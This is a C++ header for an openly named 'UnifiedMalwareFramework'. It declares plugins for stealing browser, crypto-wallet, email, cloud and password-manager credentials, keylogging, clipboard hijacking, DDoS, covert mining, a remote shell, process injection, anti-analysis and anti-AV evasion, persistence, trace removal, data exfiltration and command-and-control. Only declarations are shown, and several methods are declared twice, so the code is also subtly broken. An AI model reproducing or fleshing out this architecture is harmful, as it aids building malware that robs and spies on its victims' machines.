#pragma once

#include <string>
#include <vector>
#include <map>
#include <memory>
#include <thread>
#include <atomic>
#include <functional>
#include <filesystem>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <random>
#include <chrono>
#include <algorithm>

// Platform detection and includes
#ifdef _WIN32
    #define PLATFORM_WINDOWS
    #include <windows.h>
    #include <winreg.h>
    #include <shlobj.h>
    #include <tlhelp32.h>
    #include <psapi.h>
    #include <winsvc.h>
    #include <wininet.h>
    #include <crypt32.h>
    #include <iphlpapi.h>
    #include <ws2tcpip.h>
    #include <imagehlp.h>
    #include <wincrypt.h>
    #pragma comment(lib, "wininet.lib")
    #pragma comment(lib, "crypt32.lib")
    #pragma comment(lib, "iphlpapi.lib")
    #pragma comment(lib, "ws2_32.lib")
    #pragma comment(lib, "advapi32.lib")
    #pragma comment(lib, "imagehlp.lib")
#elif defined(__APPLE__)
    #define PLATFORM_MACOS
    #include <TargetConditionals.h>
    #if TARGET_OS_IPHONE
        #define PLATFORM_IOS
    #endif
    #include <sys/types.h>
    #include <sys/sysctl.h>
    #include <sys/stat.h>
    #include <unistd.h>
    #include <pwd.h>
    #include <dlfcn.h>
    #include <mach-o/dyld.h>
    #include <mach-o/loader.h>
    #include <mach-o/fat.h>
    #include <mach-o/swap.h>
    #include <CoreFoundation/CoreFoundation.h>
    #include <Security/Security.h>
    #include <SystemConfiguration/SystemConfiguration.h>
#elif defined(__ANDROID__)
    #define PLATFORM_ANDROID
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <unistd.h>
    #include <pwd.h>
    #include <dlfcn.h>
    #include <jni.h>
    #include <android/log.h>
    #include <android/native_activity.h>
#elif defined(__linux__)
    #define PLATFORM_LINUX
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <unistd.h>
    #include <pwd.h>
    #include <dlfcn.h>
    #include <dirent.h>
    #include <sys/sysinfo.h>
    #include <sys/utsname.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <elf.h>
#endif

// Common includes
#include <iostream>
#include <sqlite3.h>
#include <json/json.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/sha.h>
#include <openssl/md5.h>

namespace fs = std::filesystem;

// Forward declarations for all plugins
class PluginInterface;
class BrowserStealerPlugin;
class CryptoStealerPlugin;
class MessagingStealerPlugin;
class GamingStealerPlugin;
class DeveloperStealerPlugin;
class EmailStealerPlugin;
class CloudStealerPlugin;
class PasswordManagerStealerPlugin;
class VPNStealerPlugin;
class SystemStealerPlugin;
class KeyloggerPlugin;
class ScreenshotCapturePlugin;
class CryptoClipperPlugin;
class DDoSPlugin;
class SilentMinerPlugin;
class ReverseProxyPlugin;
class DNSSpooferPlugin;
class RemoteShellPlugin;
class TaskManagerPlugin;
class TelegramNotifierPlugin;
class BotManagerPlugin;
class EvasionEnginePlugin;
class ProtectionPlugin;
class FileSpooferPlugin;
class HashSpooferPlugin;
class PolymorphicEnginePlugin;
class MetamorphicEnginePlugin;
class ReflectiveInjectionPlugin;
class ProcessInjectionPlugin;
class MemoryManipulationPlugin;
class NetworkEvasionPlugin;
class AntiAnalysisPlugin;
class AntiDebugPlugin;
class AntiVMPlugin;
class AntiSandboxPlugin;
class AntiAVPlugin;
class PersistencePlugin;
class CommunicationPlugin;
class DataExfiltrationPlugin;
class CommandControlPlugin;

// Plugin interface
class PluginInterface {
public:
    virtual ~PluginInterface() = default;
    virtual std::string getName() const = 0;
    virtual std::string getVersion() const = 0;
    virtual std::string getDescription() const = 0;
    virtual bool initialize() = 0;
    virtual bool execute() = 0;
    virtual bool cleanup() = 0;
    virtual std::map<std::string, std::string> getConfiguration() const = 0;
    virtual bool setConfiguration(const std::map<std::string, std::string>& config) = 0;
    virtual std::vector<std::string> getDependencies() const = 0;
    virtual bool isEnabled() const = 0;
    virtual void setEnabled(bool enabled) = 0;
};

class UnifiedMalwareFramework {
public:
    UnifiedMalwareFramework();
    ~UnifiedMalwareFramework();
    
    // Core framework methods
    void initialize();
    void run();
    void stop();
    void shutdown();
    
    // Plugin management
    void loadAllPlugins();
    void unloadAllPlugins();
    void enablePlugin(const std::string& pluginName);
    void disablePlugin(const std::string& pluginName);
    void reloadPlugin(const std::string& pluginName);
    std::vector<std::string> getLoadedPlugins() const;
    std::vector<std::string> getEnabledPlugins() const;
    
    // Plugin access
    std::shared_ptr<BrowserStealerPlugin> getBrowserStealer();
    std::shared_ptr<CryptoStealerPlugin> getCryptoStealer();
    std::shared_ptr<MessagingStealerPlugin> getMessagingStealer();
    std::shared_ptr<GamingStealerPlugin> getGamingStealer();
    std::shared_ptr<DeveloperStealerPlugin> getDeveloperStealer();
    std::shared_ptr<EmailStealerPlugin> getEmailStealer();
    std::shared_ptr<CloudStealerPlugin> getCloudStealer();
    std::shared_ptr<PasswordManagerStealerPlugin> getPasswordManagerStealer();
    std::shared_ptr<VPNStealerPlugin> getVPNStealer();
    std::shared_ptr<SystemStealerPlugin> getSystemStealer();
    std::shared_ptr<KeyloggerPlugin> getKeylogger();
    std::shared_ptr<ScreenshotCapturePlugin> getScreenshotCapture();
    std::shared_ptr<CryptoClipperPlugin> getCryptoClipper();
    std::shared_ptr<DDoSPlugin> getDDoS();
    std::shared_ptr<SilentMinerPlugin> getSilentMiner();
    std::shared_ptr<ReverseProxyPlugin> getReverseProxy();
    std::shared_ptr<DNSSpooferPlugin> getDNSSpoofer();
    std::shared_ptr<RemoteShellPlugin> getRemoteShell();
    std::shared_ptr<TaskManagerPlugin> getTaskManager();
    std::shared_ptr<TelegramNotifierPlugin> getTelegramNotifier();
    std::shared_ptr<BotManagerPlugin> getBotManager();
    std::shared_ptr<EvasionEnginePlugin> getEvasionEngine();
    std::shared_ptr<ProtectionPlugin> getProtection();
    std::shared_ptr<FileSpooferPlugin> getFileSpoofer();
    std::shared_ptr<HashSpooferPlugin> getHashSpoofer();
    std::shared_ptr<PolymorphicEnginePlugin> getPolymorphicEngine();
    std::shared_ptr<MetamorphicEnginePlugin> getMetamorphicEngine();
    std::shared_ptr<ReflectiveInjectionPlugin> getReflectiveInjection();
    std::shared_ptr<ProcessInjectionPlugin> getProcessInjection();
    std::shared_ptr<MemoryManipulationPlugin> getMemoryManipulation();
    std::shared_ptr<NetworkEvasionPlugin> getNetworkEvasion();
    std::shared_ptr<AntiAnalysisPlugin> getAntiAnalysis();
    std::shared_ptr<AntiDebugPlugin> getAntiDebug();
    std::shared_ptr<AntiVMPlugin> getAntiVM();
    std::shared_ptr<AntiSandboxPlugin> getAntiSandbox();
    std::shared_ptr<AntiAVPlugin> getAntiAV();
    std::shared_ptr<PersistencePlugin> getPersistence();
    std::shared_ptr<CommunicationPlugin> getCommunication();
    std::shared_ptr<DataExfiltrationPlugin> getDataExfiltration();
    std::shared_ptr<CommandControlPlugin> getCommandControl();
    
    // Framework information
    std::string getFrameworkVersion() const;
    std::string getPlatform() const;
    std::string getBotId() const;
    std::string getSystemInfo() const;
    bool isRunning() const;
    
    // Configuration management
    void loadConfiguration(const std::string& configFile);
    void saveConfiguration(const std::string& configFile);
    void setConfiguration(const std::string& key, const std::string& value);
    std::string getConfiguration(const std::string& key) const;
    
    // Data management
    void addExtractedData(const std::string& data);
    std::vector<std::string> getExtractedData() const;
    void clearExtractedData();
    void encryptData();
    void uploadData();
    void saveData();
    
    // Communication
    void sendDataToServer();
    void receiveCommandsFromServer();
    void establishConnection();
    void maintainConnection();
    
    // Security and evasion
    void performEvasion();
    void checkForAnalysis();
    void implementSelfProtection();
    void validateIntegrity();
    
    // Utility methods
    void logActivity(const std::string& activity);
    void logError(const std::string& error);
    std::string getTimestamp();
    std::string encryptString(const std::string& data);
    std::string decryptString(const std::string& data);

private:
    // Core data
    std::string frameworkVersion;
    std::string platform;
    std::string botId;
    std::atomic<bool> isRunningFlag;
    std::vector<std::string> extractedData;
    std::map<std::string, std::string> configuration;
    
    // Plugin registry
    std::map<std::string, std::shared_ptr<PluginInterface>> plugins;
    std::map<std::string, bool> pluginStates;
    
    // Threads
    std::thread mainThread;
    std::thread pluginThread;
    std::thread communicationThread;
    std::thread monitoringThread;
    
    // All plugin instances
    std::shared_ptr<BrowserStealerPlugin> browserStealer;
    std::shared_ptr<CryptoStealerPlugin> cryptoStealer;
    std::shared_ptr<MessagingStealerPlugin> messagingStealer;
    std::shared_ptr<GamingStealerPlugin> gamingStealer;
    std::shared_ptr<DeveloperStealerPlugin> developerStealer;
    std::shared_ptr<EmailStealerPlugin> emailStealer;
    std::shared_ptr<CloudStealerPlugin> cloudStealer;
    std::shared_ptr<PasswordManagerStealerPlugin> passwordManagerStealer;
    std::shared_ptr<VPNStealerPlugin> vpnStealer;
    std::shared_ptr<SystemStealerPlugin> systemStealer;
    std::shared_ptr<KeyloggerPlugin> keylogger;
    std::shared_ptr<ScreenshotCapturePlugin> screenshotCapture;
    std::shared_ptr<CryptoClipperPlugin> cryptoClipper;
    std::shared_ptr<DDoSPlugin> ddos;
    std::shared_ptr<SilentMinerPlugin> silentMiner;
    std::shared_ptr<ReverseProxyPlugin> reverseProxy;
    std::shared_ptr<DNSSpooferPlugin> dnsSpoofer;
    std::shared_ptr<RemoteShellPlugin> remoteShell;
    std::shared_ptr<TaskManagerPlugin> taskManager;
    std::shared_ptr<TelegramNotifierPlugin> telegramNotifier;
    std::shared_ptr<BotManagerPlugin> botManager;
    std::shared_ptr<EvasionEnginePlugin> evasionEngine;
    std::shared_ptr<ProtectionPlugin> protection;
    std::shared_ptr<FileSpooferPlugin> fileSpoofer;
    std::shared_ptr<HashSpooferPlugin> hashSpoofer;
    std::shared_ptr<PolymorphicEnginePlugin> polymorphicEngine;
    std::shared_ptr<MetamorphicEnginePlugin> metamorphicEngine;
    std::shared_ptr<ReflectiveInjectionPlugin> reflectiveInjection;
    std::shared_ptr<ProcessInjectionPlugin> processInjection;
    std::shared_ptr<MemoryManipulationPlugin> memoryManipulation;
    std::shared_ptr<NetworkEvasionPlugin> networkEvasion;
    std::shared_ptr<AntiAnalysisPlugin> antiAnalysis;
    std::shared_ptr<AntiDebugPlugin> antiDebug;
    std::shared_ptr<AntiVMPlugin> antiVM;
    std::shared_ptr<AntiSandboxPlugin> antiSandbox;
    std::shared_ptr<AntiAVPlugin> antiAV;
    std::shared_ptr<PersistencePlugin> persistence;
    std::shared_ptr<CommunicationPlugin> communication;
    std::shared_ptr<DataExfiltrationPlugin> dataExfiltration;
    std::shared_ptr<CommandControlPlugin> commandControl;
    
    // Core methods
    void generateBotId();
    void initializePlatform();
    void initializePlugins();
    void loadDefaultConfiguration();
    void setupPersistence();
    void performInitialEvasion();
    
    // Thread methods
    void mainLoop();
    void pluginLoop();
    void communicationLoop();
    void monitoringLoop();
    
    // Plugin management methods
    void registerPlugin(const std::string& name, std::shared_ptr<PluginInterface> plugin);
    void unregisterPlugin(const std::string& name);
    bool loadPlugin(const std::string& pluginName);
    bool unloadPlugin(const std::string& pluginName);
    void executePlugins();
    void cleanupPlugins();
    
    // Platform-specific initialization
    void initializeWindows();
    void initializeMacOS();
    void initializeLinux();
    void initializeAndroid();
    
    // Error handling
    void handleError(const std::string& error);
    void recoverFromError();
    void reportError(const std::string& error);
    
    // Security methods
    void validateIntegrity();
    void checkForTampering();
    void implementSelfProtection();
    
    // Cleanup methods
    void cleanup();
    void removeTraces();
    void secureDelete(const std::string& path);
    
    // Communication methods
    void sendDataToServer();
    void receiveCommandsFromServer();
    void establishConnection();
    void maintainConnection();
    
    // Utility methods
    void logActivity(const std::string& activity);
    void logError(const std::string& error);
    std::string getTimestamp();
    std::string encryptString(const std::string& data);
    std::string decryptString(const std::string& data);
    
    // Platform-specific persistence
    void setupWindowsPersistence();
    void setupMacOSPersistence();
    void setupLinuxPersistence();
    void setupAndroidPersistence();
    
    // Platform-specific evasion
    void performWindowsEvasion();
    void performMacOSEvasion();
    void performLinuxEvasion();
    void performAndroidEvasion();
};